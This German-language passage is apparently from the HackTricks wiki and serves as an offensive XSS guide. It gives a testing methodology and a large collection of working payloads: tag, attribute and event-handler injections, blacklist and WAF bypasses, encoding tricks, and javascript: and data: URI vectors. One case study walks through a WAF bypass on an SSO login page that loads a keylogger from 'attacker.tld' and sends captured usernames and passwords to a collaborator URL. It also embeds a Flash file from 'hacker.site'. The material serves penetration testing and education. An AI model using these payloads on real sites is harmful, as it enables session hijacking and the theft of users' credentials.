# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Methodik

1. Prüfe, ob **irgendein von dir kontrollierter Wert** (_parameters_, _path_, _headers_?, _cookies_?) im HTML **reflektiert** oder von **JS**-Code **verwendet** wird.
2. **Finde den Kontext**, in dem es reflektiert/verwendet wird.
3. Wenn **reflektiert**
1. Prüfe **welche Symbole du verwenden kannst** und bereite abhängig davon das Payload vor:
1. Im **raw HTML**:
1. Kannst du neue HTML-Tags erstellen?
2. Kannst du Events oder Attribute verwenden, die das `javascript:`-Protokoll unterstützen?
3. Kannst du Schutzmechanismen umgehen?
4. Wird der HTML-Inhalt von einer clientseitigen JS-Engine interpretiert (_AngularJS_, _VueJS_, _Mavo_...), die du für eine [**Client Side Template Injection**](../client-side-template-injection-csti.md) ausnutzen könntest?
5. Wenn du keine HTML-Tags erstellen kannst, die JS-Code ausführen, könntest du eine [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html) ausnutzen?
2. Innerhalb eines **HTML-Tag-Attributs**:
1. Kannst du in den raw HTML-Kontext entkommen?
2. Kannst du neue Events/Attribute erstellen, um JS-Code auszuführen?
3. Unterstützt das Attribut, in dem du gefangen bist, die Ausführung von JS?
4. Kannst du Schutzmechanismen umgehen?
3. Innerhalb von **JavaScript-Code**:
1. Kannst du das `<script>`-Tag escapen?
2. Kannst du den String escapen und anderen JS-Code ausführen?
3. Befinden sich deine Eingaben in Template-Literalen \`\`?
4. Kannst du Schutzmechanismen umgehen?
4. Javascript **Funktion**, die **ausgeführt** wird
1. Du kannst den Namen der Funktion angeben, die ausgeführt werden soll. z.B.: `?callback=alert(1)`
4. Wenn **verwendet**:
1. Du könntest ein **DOM XSS** ausnutzen; achte darauf, wie deine Eingabe kontrolliert wird und ob deine **kontrollierte Eingabe von einem Sink verwendet** wird.

Wenn du an einem komplexen XSS arbeitest, könnte es nützlich sein, folgendes zu kennen:


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Reflektierte Werte

Um ein XSS erfolgreich auszunutzen, musst du zuerst einen **von dir kontrollierten Wert finden, der in der Webseite reflektiert wird**.

- **Intermediately reflected**: Wenn du feststellst, dass der Wert eines Parameters oder sogar des Pfads in der Webseite reflektiert wird, könntest du ein **Reflected XSS** ausnutzen.
- **Stored and reflected**: Wenn ein von dir kontrollierter Wert auf dem Server gespeichert wird und bei jedem Aufruf einer Seite reflektiert wird, könntest du ein **Stored XSS** ausnutzen.
- **Accessed via JS**: Wenn ein von dir kontrollierter Wert per JS angesprochen wird, könntest du ein **DOM XSS** ausnutzen.

## Kontexte

Wenn du versuchst, ein XSS auszunutzen, musst du zuerst wissen, **wo dein Input reflektiert wird**. Je nach Kontext kannst du auf verschiedene Weisen beliebigen JS-Code ausführen.

### Raw HTML

Wenn dein Input im **raw HTML** der Seite reflektiert wird, musst du einige **HTML-Tags** missbrauchen, um JS-Code auszuführen: `<img , <iframe , <svg , <script` ... dies sind nur einige der vielen möglichen HTML-Tags, die du verwenden kannst.\
Beachte außerdem [Client Side Template Injection](../client-side-template-injection-csti.md).

### Innerhalb von HTML-Tag-Attributen

Wenn dein Input innerhalb des Werts eines Attributs eines Tags reflektiert wird, kannst du versuchen:

1. Aus dem Attribut und aus dem Tag **zu entkommen** (dann bist du im raw HTML) und ein neues HTML-Tag zu erstellen, das du missbrauchst: `"><img [...]`
2. Wenn du **aus dem Attribut entkommen kannst, aber nicht aus dem Tag** (`>` ist kodiert oder gelöscht), kannst du je nach Tag **ein Event** erstellen, das JS-Code ausführt: `" autofocus onfocus=alert(1) x="`
3. Wenn du **nicht aus dem Attribut entkommen kannst** (`"` wird kodiert oder gelöscht), dann hängt es davon ab, **in welchem Attribut** dein Wert reflektiert wird und ob du **den gesamten Wert oder nur einen Teil** kontrollierst. Zum **Beispiel**, wenn du ein Event wie `onclick=` kontrollierst, kannst du beliebigen Code ausführen, wenn darauf geklickt wird. Ein weiteres interessantes **Beispiel** ist das Attribut `href`, wo du das `javascript:`-Protokoll nutzen kannst, um beliebigen Code auszuführen: **`href="javascript:alert(1)"`**
4. Wenn dein Input in "**nicht ausnutzbaren Tags**" reflektiert wird, könntest du den **`accesskey`**-Trick probieren, um die Verwundbarkeit auszunutzen (du benötigst dafür eine Form von Social Engineering): **`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS hinter WAFs

Eine unternehmensweite SSO-Login-Seite reflektierte den OAuth-Parameter `service` innerhalb des `href`-Attributs von `<a id="forgot_btn" ...>`. Obwohl `<` und `>` HTML-kodiert wurden, waren doppelte Anführungszeichen nicht kodiert, sodass der Angreifer das Attribut schließen und dasselbe Element wiederverwenden konnte, um Handler wie `" onfocus="payload" x="` einzuschleusen.

1. **Inject the handler:** Einfache Payloads wie `onclick="print(1)"` wurden geblockt, aber der WAF überprüfte nur die erste JavaScript-Anweisung in inline-Attributen. Das Vorsetzen eines harmlosen Ausdrucks in Klammern, gefolgt von einem Semikolon, erlaubte es dem echten Payload zu laufen: `onfocus="(history.length);malicious_code_here"`.
2. **Auto-trigger it:** Browser fokussieren jedes Element, dessen `id` mit dem Fragment übereinstimmt, daher zwingt das Anhängen von `#forgot_btn` an die Exploit-URL den Anchor beim Laden der Seite in den Fokus und führt den Handler ohne Klick aus.
3. **Keep the inline stub tiny:** Das Ziel lieferte bereits jQuery aus. Der Handler musste nur eine Anfrage über `$.getScript(...)` bootstrappen, während der vollständige Keylogger auf dem Server des Angreifers lag.

**Strings ohne Anführungszeichen aufbauen**

Einfache Anführungszeichen wurden URL-kodiert zurückgegeben und escaped doppelte Anführungszeichen zerstörten das Attribut, daher generierte das Payload jeden String mit `String.fromCharCode`. Eine Hilfsfunktion macht es einfach, jede URL in Char-Codes zu konvertieren, bevor man sie in das Attribut einfügt:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
Ein resultierendes Attribut sah folgendermaßen aus:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**Warum dies Anmeldeinformationen stiehlt**

Das externe Script (geladen von einem vom Angreifer kontrollierten Host oder Burp Collaborator) hookte `document.onkeypress`, puffert Tastenanschläge und sendete jede Sekunde `new Image().src = collaborator_url + keys`. Da das XSS nur für nicht authentifizierte Benutzer ausgelöst wird, ist die sensitive Aktion das Login-Formular selbst — der Angreifer zeichnet Benutzernamen und Passwörter auf, selbst wenn das Opfer nie auf "Login" klickt.

Seltsames Beispiel dafür, wie Angular XSS ausführt, wenn du einen Klassennamen kontrollierst:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Im JavaScript-Code

In diesem Fall wird deine Eingabe zwischen **`<script> [...] </script>`** Tags einer HTML-Seite, in einer `.js`-Datei oder in einem Attribut mit dem **`javascript:`**-Protokoll reflektiert:

- Wenn sie zwischen **`<script> [...] </script>`** Tags reflektiert wird, selbst wenn deine Eingabe in irgendeiner Art von Anführungszeichen steht, kannst du versuchen `</script>` zu injizieren und aus diesem Kontext zu entkommen. Das funktioniert, weil der **Browser zuerst die HTML-Tags parst** und danach den Inhalt, daher wird er nicht bemerken, dass dein injiziertes `</script>` Tag im HTML-Code steht.
- Wenn sie **innerhalb eines JS-Strings** reflektiert wird und der letzte Trick nicht funktioniert, musst du **den String verlassen**, **deinen Code ausführen** und den JS-Code **wiederaufbauen** (wenn ein Fehler auftritt, wird er nicht ausgeführt:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Wenn sie innerhalb von template literals reflektiert wird, kannst du **JS-Ausdrücke einbetten** mit der `${ ... }`-Syntax: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** funktioniert, um **valid javascript code** zu schreiben:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting bezeichnet die Möglichkeit, **Funktionen, Variablen oder Klassen erst nach ihrer Verwendung zu deklarieren, sodass du Szenarien ausnutzen kannst, in denen ein XSS undeclared variables oder functions verwendet.**\
**Siehe die folgende Seite für mehr Infos:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Mehrere Webseiten haben Endpunkte, die **als Parameter den Namen der auszuführenden Funktion akzeptieren**. Ein häufiges Beispiel in freier Wildbahn ist so etwas wie: `?callback=callbackFunc`.

Eine gute Methode, um herauszufinden, ob etwas, das direkt vom Benutzer kommt, versucht ausgeführt zu werden, ist, **den Parameterwert zu ändern** (zum Beispiel zu 'Vulnerable') und in der Konsole nach Fehlern wie diesen zu suchen:

![](<../../images/image (711).png>)

Falls es verwundbar ist, könntest du ein alert auslösen, indem du einfach den Wert sendest: **`?callback=alert(1)`**. Allerdings ist es sehr häufig, dass diese Endpunkte den Inhalt **validieren**, um nur Buchstaben, Zahlen, Punkte und Unterstriche zu erlauben (**`[\w\._]`**).

Trotz dieser Einschränkung ist es weiterhin möglich, bestimmte Aktionen durchzuführen. Das liegt daran, dass du diese erlaubten Zeichen verwenden kannst, um auf jedes Element im DOM zuzugreifen:

![](<../../images/image (747).png>)

Einige nützliche Funktionen dafür:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Du kannst auch versuchen, **Javascript-Funktionen direkt auszulösen**: `obj.sales.delOrders`.

Allerdings sind die Endpunkte, die die angegebene Funktion ausführen, normalerweise Endpunkte ohne besonders interessanten DOM; **other pages in the same origin** haben oft einen **interessanteren DOM**, um mehr Aktionen durchzuführen.

Daher wurde zur **Ausnutzung dieser Schwachstelle in einem anderen DOM** die **Same Origin Method Execution (SOME)**-Exploitation entwickelt:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Es gibt **JS code**, der **unsicher** einige **vom Angreifer kontrollierte Daten** wie `location.href` verwendet. Ein Angreifer könnte dies ausnutzen, um beliebigen JS-Code auszuführen.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Diese Art von XSS kann **überall** gefunden werden. Sie hängen nicht nur von der Client-Ausnutzung einer Webanwendung ab, sondern von **jedem** **Kontext**. Diese Form der **arbitrary JavaScript execution** kann sogar dazu missbraucht werden, **RCE** zu erlangen, **beliebige** **Dateien** auf Clients und Servern **zu lesen**, und mehr.  
Some **examples**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

Wenn deine Eingabe **innerhalb der HTML page** reflektiert wird oder du in diesem Kontext HTML-Code escapen und injizieren kannst, ist das **erste**, was du tun musst, zu prüfen, ob du `<` zum Erstellen neuer Tags missbrauchen kannst: Versuche einfach, dieses **char** zu **reflecten** und prüfe, ob es **HTML encoded** wird oder **gelöscht** wird oder ob es **unverändert reflected** wird. **Nur im letzten Fall wirst du diesen Fall exploiten können**.  
Beachte in diesen Fällen auch [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**  
_**Hinweis: Ein HTML-Kommentar kann mit `-->` oder `--!>` geschlossen werden**_

In diesem Fall und falls kein Black/Whitelisting verwendet wird, könntest du Payloads wie:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Aber wenn tags/attributes black/whitelisting verwendet wird, musst du **brute-force herausfinden, welche tags** du erstellen kannst. Sobald du **lokalisiert hast, welche tags erlaubt sind**, musst du **brute-force Attribute/Events** innerhalb der gefundenen gültigen Tags testen, um zu sehen, wie du den Kontext angreifen kannst.

### Tags/Events brute-force

Gehe zu [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) und klicke auf _**Copy tags to clipboard**_. Sende dann alle mit Burp intruder und prüfe, ob der WAF einige tags nicht als schädlich erkannt hat. Sobald du herausgefunden hast, welche tags du verwenden kannst, kannst du **brute force alle events** mit den gültigen tags testen (auf derselben Webseite auf _**Copy events to clipboard**_ klicken und das gleiche Verfahren wie zuvor anwenden).

### Custom tags

Wenn du kein gültiges HTML tag gefunden hast, kannst du versuchen, **ein custom tag zu erstellen** und mit dem `onfocus`-Attribut JS-Code auszuführen. In der XSS-Anfrage musst du die URL mit `#` beenden, damit die Seite auf dieses Objekt **fokussiert** und der Code **ausgeführt** wird:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Wenn irgendeine Art von blacklist verwendet wird, könntest du versuchen, sie mit einigen einfachen Tricks zu bypassen:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Weitere tiny XSS für verschiedene Umgebungen** payload [**can be found here**](https://github.com/terjanq/Tiny-XSS-Payloads) und [**here**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
Das letzte verwendet 2 Unicode-Zeichen, die sich auf 5 erweitern: telsr\
More of these characters can be found [here](https://www.unicode.org/charts/normalization/).\
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Wenn du zur Ausnutzung der Schwachstelle den **Benutzer benötigst, damit er auf einen Link oder ein Formular** mit vorausgefüllten Daten klickt, könntest du versuchen, [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (falls die Seite verwundbar ist).

### Impossible - Dangling Markup

Wenn du denkst, dass **es unmöglich ist, ein HTML-Tag mit einem Attribut zu erzeugen, um JS-Code auszuführen**, solltest du [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html) überprüfen, weil du die Schwachstelle **ausnutzen** könntest **ohne** **JS**-Code auszuführen.

## Injektion innerhalb eines HTML-Tags

### Innerhalb des Tags / Aus dem Attributwert entkommen

Wenn du dich **in einem HTML-Tag befindest**, ist das Erste, was du versuchen könntest, aus dem Tag zu **entkommen** und einige der in der [previous section](#injecting-inside-raw-html) genannten Techniken zu verwenden, um JS-Code auszuführen.\
Wenn du **nicht aus dem Tag entkommen kannst**, könntest du neue Attribute innerhalb des Tags erstellen, um zu versuchen, JS-Code auszuführen, zum Beispiel mit einem payload wie (_Hinweis: In diesem Beispiel werden doppelte Anführungszeichen verwendet, um aus dem Attribut zu entkommen; du wirst sie nicht benötigen, wenn deine Eingabe direkt innerhalb des Tags reflektiert wird_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Style-Ereignisse**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Innerhalb des Attributs

Auch wenn du **nicht aus dem Attribut entkommen kannst** (`"` wird encodiert oder gelöscht), abhängig davon, **in welchem Attribut** dein Wert reflektiert wird und **ob du den gesamten Wert oder nur einen Teil kontrollierst**, kannst du es ausnutzen. Zum **Beispiel**, wenn du ein Event wie `onclick=` kontrollierst, kannst du es so ausführen, dass beim Klicken beliebiger Code ausgeführt wird.\ Ein weiteres interessantes **Beispiel** ist das Attribut `href`, wo du das `javascript:`-Protokoll verwenden kannst, um beliebigen Code auszuführen: **`href="javascript:alert(1)"`**

**Bypass innerhalb des Events mit HTML-Encoding/URL-Encoding**

Die **HTML-enkodierten Zeichen** im Wert von HTML-Tag-Attributen werden **zur Laufzeit dekodiert**. Daher ist etwas wie das Folgende gültig (der Payload ist fettgedruckt): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Beachte, dass **jede Art von HTML-Encoding gültig ist**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Beachte, dass URL encode ebenfalls funktioniert:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass innerhalb eines Events mittels Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Spezielle Protokolle im Attribut

Dort kannst du in manchen Fällen die Protokolle **`javascript:`** oder **`data:`** verwenden, um **beliebigen JS-Code auszuführen**. Manche erfordern Benutzerinteraktion, andere nicht.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Orte, an denen du diese Protokolle injizieren kannst**

**Im Allgemeinen** kann das `javascript:`-Protokoll **in jedem Tag verwendet werden, das das Attribut `href` akzeptiert** und in **den meisten** Tags, die das **Attribut `src`** akzeptieren (aber nicht `<img`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Andere Obfuskationstricks**

_**In diesem Fall sind der HTML encoding- und der Unicode encoding-Trick aus dem vorherigen Abschnitt ebenfalls gültig, da du dich innerhalb eines Attributs befindest.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Außerdem gibt es einen weiteren **netten Trick** für diese Fälle: **Selbst wenn deine input innerhalb von `javascript:...` URL encoded wird, wird sie vor der Ausführung URL decoded.** Wenn du also aus dem **string** mit einem **single quote** **escape** musst und siehst, dass **it's being URL encoded**, denk daran, dass **das keine Rolle spielt,** es wird zur **Ausführungszeit** als **single quote** interpretiert.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Beachte, dass es **nicht** **funktionieren** wird, wenn du versuchst, **beide** `URLencode + HTMLencode` in beliebiger Reihenfolge zu verwenden, um den **payload** zu kodieren; du kannst sie jedoch **im payload mischen**.

**Verwendung von Hex and Octal encode mit `javascript:`**

Du kannst **Hex** und **Octal encode** innerhalb des `src`-Attributs von `iframe` (zumindest) verwenden, um **HTML tags to execute JS** zu deklarieren:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
If you can inject any URL in an arbitrary **`<a href=`** tag that contains the **`target="_blank" and rel="opener"`** attributes, check the **following page to exploit this behavior**:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### Bypass von 'on' Event-Handlern

Prüfe zuerst diese Seite ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) auf nützliche **'on' Event-Handler**.  
Falls eine Blacklist verhindert, dass du diese Event-Handler erstellen kannst, kannst du die folgenden Bypässe versuchen:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS in "Unexploitable tags" (hidden input, link, canonical, meta)

Aus [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **ist es jetzt möglich, hidden inputs wie folgt zu missbrauchen:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
Und in **Meta-Tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Von [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Sie können eine **XSS payload inside a hidden attribute** ausführen, vorausgesetzt, Sie können das **victim** dazu **überreden**, die **Tastenkombination** zu drücken. In Firefox unter Windows/Linux ist die Tastenkombination **ALT+SHIFT+X** und auf OS X **CTRL+ALT+X**. Sie können eine andere Tastenkombination angeben, indem Sie eine andere Taste im access key attribute verwenden. Hier ist der Vektor:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Die XSS payload wird ungefähr so aussehen: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

Mehrere Tricks mit verschiedenen Encodings wurden bereits in diesem Abschnitt gezeigt. Gehe **zurück, um zu lernen, wo du Folgendes verwenden kannst:**

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Siehe den [Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Siehe die [JavaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Wenn du ein **XSS in einem sehr kleinen Bereich** der Webseite gefunden hast, das irgendeine Art von Interaktion erfordert (vielleicht ein kleiner Link im footer mit einem onmouseover Element), kannst du versuchen, den Raum, den dieses Element einnimmt, zu **verändern**, um die Wahrscheinlichkeit zu maximieren, dass der Link ausgelöst wird.

For example, you could add some styling in the element like: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Wenn jedoch der WAF das style attribute filtert, kannst du CSS Styling Gadgets verwenden, also wenn du zum Beispiel findest

> .test {display:block; color: blue; width: 100%\}

und

> \#someid {top: 0; font-family: Tahoma;}

Jetzt kannst du unseren Link modifizieren und in die folgende Form bringen

> \<a href="" id=someid class=test onclick=alert() a="">

This trick was taken from [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Injecting inside JavaScript code

In diesem Fall wird dein **input** innerhalb des JS-Codes einer `.js` Datei oder zwischen `<script>...</script>` tags oder zwischen HTML events, die JS code ausführen können, oder in Attributen, die das `javascript:`-Protokoll akzeptieren, reflektiert.

### Escaping \<script> tag

Wenn dein Code innerhalb von `<script> [...] var input = 'reflected data' [...] </script>` eingefügt wird, kannst du leicht das Schließen des `<script>`-Tags **escape**:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Beachte, dass wir in diesem Beispiel **das einzelne Anführungszeichen nicht einmal geschlossen haben**. Das liegt daran, dass **HTML-Parsing zuerst vom Browser durchgeführt wird**, wobei Seiten-Elemente identifiziert werden, einschließlich Script-Blöcken. Die Analyse von JavaScript, um die eingebetteten Skripte zu verstehen und auszuführen, erfolgt erst danach.

### Innerhalb von JS-Code

Wenn `<>` bereinigt werden, kannst du dennoch **escape the string** dort, wo deine Eingabe **located** ist, und **execute arbitrary JS**. Es ist wichtig, **fix JS syntax**, denn wenn Fehler vorhanden sind, wird der JS-Code nicht ausgeführt:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Wenn Benutzereingaben in einem in Anführungszeichen stehenden JavaScript-String landen (z. B. serverseitiges Echo in ein Inline-Script), kannst du die Zeichenkette beenden, Code injizieren und die Syntax reparieren, damit das Parsen gültig bleibt. Generisches Grundgerüst:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Beispiel-URL-Muster, wenn der verwundbare Parameter in einen JS-String reflektiert wird:
```
?param=test";<INJECTION>;a="
```
Dies führt Angreifer-JS aus, ohne den HTML-Kontext berühren zu müssen (pure JS-in-JS). Kombiniere dies mit blacklist bypasses weiter unten, wenn Filter Keywords blockieren.

### Template literals ``

Um **Strings** zu konstruieren akzeptiert JS neben einfachen und doppelten Anführungszeichen auch **backticks** **` `` `**. Dies ist als template literals bekannt, da sie erlauben, **eingebettete JS-Ausdrücke** mit der `${ ... }`-Syntax zu verwenden.\
Daher, wenn du feststellst, dass deine Eingabe innerhalb eines JS-Strings, der backticks verwendet, **reflected** wird, kannst du die `${ ... }`-Syntax missbrauchen, um **beliebigen JS-Code** auszuführen:

Dies kann **missbraucht** werden mit:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Kodierte Codeausführung
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Deliverable payloads mit eval(atob()) und Scope-Nuancen

